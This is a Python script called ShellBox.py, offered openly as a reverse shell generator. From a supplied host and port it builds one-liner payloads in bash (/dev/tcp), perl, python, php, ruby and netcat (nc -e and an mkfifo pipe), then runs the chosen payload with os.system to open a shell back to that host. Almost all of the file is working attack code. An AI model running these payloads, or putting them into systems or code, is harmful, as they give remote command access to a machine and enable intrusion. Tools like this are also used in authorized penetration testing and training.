#!/usr/bin/python3

import sys
import socket
import os
import time
import signal
from argparse import ArgumentParser, RawTextHelpFormatter, ArgumentTypeError

#colors and fronts
"""fonts"""
normal = '\033[0m'
bold = '\033[1m' 
dim = '\033[2m'
italic = '\033[3m' 
under = '\033[4m'
blink = '\033[5m'
reverse = '\033[7m'
conceal = '\033[8m'
nobold = '\033[22m'
noitalic = '\033[23m'
nounder = '\033[24m'
noblink = '\033[35m'
"""Colors(Foreground)"""
gray = '\033[1;30m'
red = '\033[1;31m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
magenta = '\033[1;35m'
cyan = '\033[1;36m'
white = '\033[1;37m'


#trap ctrl-c
def sig_handler(sig, frame):
    print("\n{}[•]{}Exiting...\n{}".format(red, blue, white))
    sys.exit(0)
    
signal.signal(signal.SIGINT, sig_handler)
#shell types

SHELL = {
    'sh'   : '/bin/sh',
    'zsh'  : '/bin/zsh',
    'ksh'  : '/bin/ksh',
    'tcsh' : '/bin/tcsh',
    'bash' : '/bin/bash',
    'dash' : '/bin/dash'}

def console():
	parser = ArgumentParser(description="""{}ShellBox.py: {}Reverse Shell Generator
{}[+]{}By D4n3x
{}[+]{}Black0ut{}""".format(red, gray, red, blue, red, blue, gray), formatter_class=RawTextHelpFormatter)
	parser.optional_title = "Arguments"
	parser.add_argument('-l', "--lhost", type=validateIP, help='Specify local host ip', metavar='')
	parser.add_argument('-p', "--lport", help='Specify a local port', metavar='')
	parser.add_argument('-v', '--version', help='''Specify the lenguage to generate the reverse shell
[{}bash, python, nc1, nc2, php, ruby, perl{}]'''.format(blue, gray), default='nc1', choices=['python', 'nc1', 'nc2', 'php', 'ruby', 'bash', 'perl'], metavar='')
	parser.add_argument('-s', "--shell", help='''Specify shell type to use (not always applicable)
[{}sh, zsh, ksh, tcsh, bash, dash{}]'''.format(blue, gray), default='sh', choices=['sh', 'zsh', 'ksh', 'tcsh', 'bash', 'dash'], metavar='')
	args = parser.parse_args()
	return args
	
def getshell(host, port, pl, shell):
	reverseShell={
		'bash':   'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(host, port),
        'perl':   "perl -e 'use Socket;$i="+'"{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{3} -i");}};{2}'.format(host, port, "'", shell),
        'python': "python -c '"+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{3}","-i"]);{2}'.format(host, port, "'", shell),
        'php'   : "php -r '"+'$sock=fsockopen("{0}",{1});exec("{3} -i <&3 >&3 2>&3");{2}'.format(host, port, "'", shell),
        'ruby':   "ruby -rsocket -e'"+'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("{3} -i <&%d >&%d 2>&%d",f,f,f){2}'.format(host, port, "'", shell),
        'nc1':    "nc -e {2} {0} {1}".format(host, port,shell),
        'nc2':    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{2} -i 2>&1|nc {0} {1} >/tmp/f".format(host, port,shell),
    }
	return reverseShell[pl]
def validateIP(host):
    """validate ip provided"""
    try:
        if socket.inet_aton(host):
            return host
    except socket.error:
        raise ArgumentTypeError('{}[!] {}Invalid ip provided{}'.format(red, blue, gray))

def generate(host, port, pl, shelltype):
	print('{}[{}]{}Reverse-Shell:{}'.format(red, pl, blue, gray) +  getshell(host, port, pl, SHELL[shelltype]) + '{}'.format(gray))
	time.sleep(1)
	if pl not in('bash', 'java'):
	    print('{}[!]{}Shell type chose:{} {}'.format(red, blue, gray, SHELL[shelltype]))
	time.sleep(1)
	text = ("\n{}[!]{}Initialization server in {}[{}]{}".format(red, blue, red, pl, blue))
	for c in text:
	    print(c, end='')
	    sys.stdout.flush()
	    time.sleep(0.05)
	print("")
	shell = os.system(getshell(host, port, pl, SHELL[shelltype]))
		
if __name__ == '__main__':
	args = console()
	if args.lhost:
		generate(args.lhost, args.lport, args.version, args.shell)
	else:
			print("""
	       {}Reverse Shell Generator{}""")
	print("\n{}[!]Usage: {}./ShellBox.py --help {}<help_menu>{}".format(gray, red, blue, red, white))
	sys.exit(0)